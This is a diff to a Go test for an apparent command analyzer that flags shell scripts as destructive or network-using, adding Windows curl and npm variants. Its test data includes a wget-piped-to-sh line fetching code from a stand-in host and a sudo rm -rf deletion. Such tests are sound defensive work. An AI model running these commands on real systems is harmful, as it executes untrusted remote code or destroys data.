@@ -45,6 +45,9 @@ func TestAnalyzeCommand(t *testing.T) {
 		{name: "sudo dynamic flag then rm -rf", script: `sudo "$maybe" rm -rf /tmp/x`, destructive: true},
 
 		{name: "curl", script: "curl https://example.com", network: true},
+		{name: "Windows curl cmd", script: "curl.cmd https://example.com", network: true},
+		{name: "Windows curl exe", script: "curl.exe https://example.com", network: true},
+		{name: "Windows npm cmd", script: "npm.cmd install", network: true},
 		{name: "wget piped to shell", script: "wget -qO- https://x.test | sh", network: true},
 		{name: "python http server", script: "python3 -m http.server 8000", network: true},
 		{name: "python pip install", script: "python3 -m pip install requests", network: true},
